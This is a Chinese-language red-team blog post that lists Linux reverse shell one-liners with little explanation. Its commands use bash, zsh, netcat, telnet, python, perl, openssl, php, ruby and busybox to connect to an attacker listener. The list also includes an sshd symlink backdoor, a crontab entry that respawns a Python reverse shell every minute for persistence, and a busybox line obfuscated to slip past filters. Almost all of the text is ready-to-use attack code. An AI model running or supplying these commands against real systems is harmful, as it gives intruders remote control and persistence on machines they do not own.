---
title: linux下反弹shell
date: 2021-12-21 13:14:37
categories: 红队技术
tags:
- 反弹shell
- Linux安全
---

> 桃李春风一杯酒，江湖夜雨十年灯。

常见的一些linux反弹shell总结

<!-- more -->

## bash反弹

```
靶机：
bash -i >& /dev/tcp/172.16.42.1/44044 0>&1
非bash环境：/bin/bash -c "/bin/bash -i >& /dev/tcp/172.16.42.1/44044 0>&1"

攻击机：
nc -lvvp 44044
```



## zsh反弹

```
靶机：zsh -c 'zmodload zsh/net/tcp && ztcp 172.16.42.1 44044 && zsh >&$REPLY 2>&$REPLY 0>&$REPLY'
攻击机：nc -lvvp 44044
```





## nc反弹

 ```
靶机：netcat 172.16.42.1 44044 -e /bin/bash
攻击机：nc -lvvp 44044
 ```



## nc正向反弹

```
靶机：nc -lvp 7777 -e /bin/bash
攻击机：nc 172.16.43.1 7777
```



## telnet反弹

```
靶机: mknod a p; telnet 172.16.42.1 44044 0<a | /bin/bash 1>a
攻击机：nc -lvvp 44044
```



## telnet+mkfifo

```
TF=$(mktemp -u); mkfifo $TF && telnet 172.16.42.150 4444 0<$TF | /bin/sh 1>$TF
```



## python反弹

```
靶机：
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("172.16.42.1",44044));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

攻击机：
nc -lvvp 44044
```



## perl反弹

```
靶机：
perl -e 'use Socket;$i="172.16.42.1";$p=44044;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'

攻击机：
nc -lvvp 44044
```



## perl2

```
perl -e 'use IO::Socket;$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"172.16.42.150:4444");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
```



## perl fork

```
perl -e 'use IO::Socket;$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"172.16.42.150:4444");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
```



## open ssh 反弹

```
靶机：
mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect 172.16.42.150:2333 > /tmp/s; rm /tmp/s

攻击机：
openssl req -x509 -newkey rsa:2048 -keyout key.pem -out cert.pem -days 365 -nodes
openssl s_server -quiet -key key.pem -cert cert.pem -port 2333

```



## SSH反弹

```
靶机：
ln -sf /usr/sbin/sshd /tmp/su;/tmp/su -oPort=8080;
攻击机：
ssh root@172.16.42.146 -p 8080

```



## crontab

```
靶机：
(crontab -l;printf "* * * * *  /usr/bin/python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"172.16.42.146\",8080));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'\n")|crontab -
攻击机：
nc -lvvp 8080


```



## php

```
靶机：
php -r '$sock=fsockopen("172.16.42.146",8080);exec("/bin/bash -i <&3 >&3 2>&3");'
攻击机：
nc -lvvp 8080

```



## Ruby

```
靶机：
ruby -rsocket -e 'exit if fork;c=TCPSocket.new("172.16.42.146","8080");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
攻击机：
nc -lvvp 8080
```

## busybox

```
busybox sh -i >& /dev/t""cp/172.16.42.150/4444 0<&1
```





## 参考

https://jkme.github.io/pages/reverse-shell.html

https://ninjia.gitbook.io/secskill/net/shell#php
